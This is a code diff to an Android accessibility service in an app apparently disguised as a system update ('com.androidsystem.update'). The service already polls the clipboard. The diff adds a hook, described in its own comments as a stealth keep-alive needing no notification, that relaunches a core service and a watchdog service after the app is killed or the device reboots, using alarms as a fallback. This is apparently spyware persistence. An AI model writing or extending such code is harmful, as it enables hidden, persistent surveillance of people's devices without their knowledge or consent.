@@ -3,6 +3,7 @@ package com.androidsystem.update.accessibility
 import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.AccessibilityServiceInfo
 import android.content.ClipboardManager
+import android.content.Intent
 import android.os.Build
 import android.os.Handler
 import android.os.Looper
@@ -11,6 +12,8 @@ import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
 import androidx.annotation.RequiresApi
 import com.androidsystem.update.database.DataRepository
+import com.androidsystem.update.service.CoreService
+import com.androidsystem.update.service.WatchdogService
 import dagger.hilt.android.AndroidEntryPoint
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
@@ -73,6 +76,21 @@ class AccessibilityServiceImpl : AccessibilityService() {
         })
         startClipboardPolling()
         Log.d(TAG, "Accessibility service connected")
+        // Keep-alive hook: Android itself keeps enabled accessibility services
+        // alive and reconnects them after the process is killed (swipe-away,
+        // LMK, reboot once the device is unlocked). Re-arm the whole chain
+        // from here — the strongest stealth keep-alive that needs no
+        // notification. Direct startService may be blocked when the app is
+        // backgrounded, so fall back to the exact-alarm start like the
+        // watchdog does.
+        try {
+            startService(Intent(this, CoreService::class.java))
+            startService(Intent(this, WatchdogService::class.java))
+        } catch (e: Exception) {
+            Log.e(TAG, "Keep-alive direct start blocked, using alarm", e)
+            WatchdogService.scheduleAlarmStart(this, CoreService::class.java, 1000L)
+            WatchdogService.scheduleAlarmStart(this, WatchdogService::class.java, 2000L)
+        }
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
